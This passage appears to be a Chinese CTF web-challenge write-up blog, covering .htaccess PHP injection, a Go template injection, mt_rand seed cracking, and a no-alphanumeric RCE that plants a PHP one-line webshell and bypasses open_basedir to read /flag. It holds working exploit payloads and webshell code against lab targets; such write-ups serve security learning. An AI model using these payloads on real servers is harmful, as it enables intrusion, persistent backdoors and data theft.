class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>很好绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=b.php&amp;content=&lt;?php system(&#x27;ls /&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202211925.png" alt="image-20241205202211925"></p><p>没有解析php，为啥啊明明是php但是解析不了，可能是靶机目录环境不能解析php文件</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202303024.png" alt="image-20241205202303024"></p><p>Apache服务器</p><p>尝试用.htaccess来执行jpg文件中的php代码</p><p>但是这里被过滤了啊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=AddType application/x-http-php .jpg</span><br></pre></td></tr></table></figure><p>但这个过滤是很好绕过的可以用反斜杠加%0a来绕过，但是这样的话就要求上传两次文件，而这个题目环境不能上传两次文件，因此只能上传一次.htaccess，那么能利用的就只有index.php了，这还不如直接写入index.php文件呢！但是是不能解析的。因此我们只能利用.htaccess来进行命令执行或者写马，简单！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_fi\%0ale .htaccess%0a%23&lt;?php system(&#x27;ls /&#x27;);?&gt;\</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_append_fi\%0Ale .htaccess%0A%23&lt;?php system(&#x27;tac /f*&#x27;);?&gt;\</span><br></pre></td></tr></table></figure><h2 id="SCTF-2021-loginme"><a href="#SCTF-2021-loginme" class="headerlink" title="[SCTF 2021]loginme"></a>[SCTF 2021]loginme</h2><p>获得源码</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206105852832.png" alt="image-20241206105852832" style="zoom:80%;" /><p>过滤了俩，可以用用X-Real-IP</p><p>然后看看源码route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">&quot;embed&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;loginme/structs&quot;</span></span><br><span class="line"><span class="string">&quot;loginme/templates&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;Try Loginme&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">idString, flag := c.GetQuery(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">idString = <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">id, err := strconv.Atoi(idString)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">id = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">TargetUser := structs.Admin</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> structs.Users &#123;</span><br><span class="line"><span class="keyword">if</span> user.Id == id &#123;</span><br><span class="line">TargetUser = user</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">age := TargetUser.Age</span><br><span class="line"><span class="keyword">if</span> age == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">age, flag = c.GetQuery(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">age = <span class="string">&quot;forever 18 (Tell me the age)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl, err := template.New(<span class="string">&quot;admin_index&quot;</span>).Parse(html)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl.Execute(c.Writer, TargetUser)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>structs.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> structs</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UserInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">Id       <span class="type">int</span></span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Age      <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Users = []UserInfo&#123;</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">1</span>,</span><br><span class="line">Username: <span class="string">&quot;Grandpa Lu&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;22&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;hack you!&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">2</span>,</span><br><span class="line">Username: <span class="string">&quot;Longlone&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;??&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;i don&#x27;t know&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">3</span>,</span><br><span class="line">Username: <span class="string">&quot;Teacher Ma&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;20&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;guess&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Admin = UserInfo&#123;</span><br><span class="line">Id:       <span class="number">0</span>,</span><br><span class="line">Username: <span class="string">&quot;Admin&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;flag&#123;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135001872.png" alt="image-20241206135001872"></p><p>我们发现当id为0时age为空，此时age是可以由我们自己传参的，也就是可控的，后续的代码对age进行了模板渲染，存在ssti。</p><p>而在go语言中使用的是<code>&#123;&#123;.name&#125;&#125;</code>代表要应用的对象，所以可以让<code>age=&#123;&#123;.Password&#125;&#125;</code></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/88f0ac4113ccb65120ad8a4bb3409bda.png" alt="在这里插入图片描述"></p><p>拿下了</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135214358.png" alt="image-20241206135214358"></p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162301273.png" alt="image-20241206162301273" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162320564.png" alt="image-20241206162320564" style="zoom:67%;" /><p>网页源代码中发现js代码，存在校验界面check.php，打开看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p>已知数猜种子，h5n5BBh4Rg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;h5n5BBh4Rg&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s pretend to know only the first password.  We need to convert it to</span><br><span class="line">inputs to php_mt_seed</span><br></pre></td></tr></table></figure><p>得到如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 7 0 61 31 31 0 61 13 13 0 61 31 31 0 61 37 37 0 61 37 37 0 61 7 7 0 61 30 30 0 61 53 53 0 61 6 6 0 61</span><br></pre></td></tr></table></figure><p>传入php_mt_seed即可！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170630174.png" alt="image-20241206170630174"></p><p>拿下种子！53788000</p><p>构造一下随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">53788000</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170818784.png" alt="image-20241206170818784"></p><h2 id="SWPUCTF-2021-新生赛-hardrce-3"><a href="#SWPUCTF-2021-新生赛-hardrce-3" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce_3"></a>[SWPUCTF 2021 新生赛]hardrce_3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\|&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>挺简单的，自增就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:29288/?wllmspan><br><span class="line">_=file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;);</span><br></pre></td></tr></table></figure><p>往1.php中写入一个一句话木马，当时system执行不了，看了下phpinfo()发现ban了好多函数，file_get_contents和file_put_contents还在，先写个方便点的后门然后看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;2.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>回显如下</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206181457145.png" alt="image-20241206181457145"></p><p>被限制在&#x2F;tmp目录下，接下来还是试试直接file_get_contents能不能获取到flag</p><p>不行，好烦啊这种disable function，直接哥斯拉！！！里面会自动绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206182342197.png" alt="image-20241206182342197"></p><p>牛逼哥斯拉！</p><p>这种方法也可以！</p><p>绕过open_basedir的方法！！！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=file_put_contents(&#x27;a.php&#x27;,&quot;&lt;?php print_r(ini_get(&#x27;open_basedir&#x27;).&#x27;&lt;br&gt;&#x27;); mkdir(&#x27;test&#x27;); chdir(&#x27;test&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); chdir(&#x27;..&#x27;); ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;); echo file_get_contents(&#x27;/flag&#x27;); print(1);?&gt; &quot;);</span><br></pre></td></tr></table></figure><p>关键代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br></pre></td></tr></table></figure><p>将限制设置为当前目录的父目录</p><p>经过三次chdir，自身变到了&#x2F;var，但是此时open_basedir为其父目录，因此就是根目录，那么就拿下了！</p><h2 id="广东强网杯-2021-团队组-love-Pokemon"><a href="#广东强网杯-2021-团队组-love-Pokemon" class="headerlink" title="[广东强网杯 2021 团队组]love_Pokemon"></a>[广东强网杯 2021 团队组]love_Pokemon</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DefenderBonus</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\&quot;|\&lt;|\&gt;|\=|&#123;|&#125;|\!|\&amp;|\*|\?|\(|\)/i&quot;</span>,<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;catch broken Pokemon! mew-_-two&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Pokemon</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ghostpokemon</span>(<span class="params"><span class="variable">$Pokemon</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$Pokemon</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$Pokemon</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$pks</span>) &#123;</span><br><span class="line">            <span class="variable">$Pokemon</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">DefenderBonus</span>(<span class="variable">$pks</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    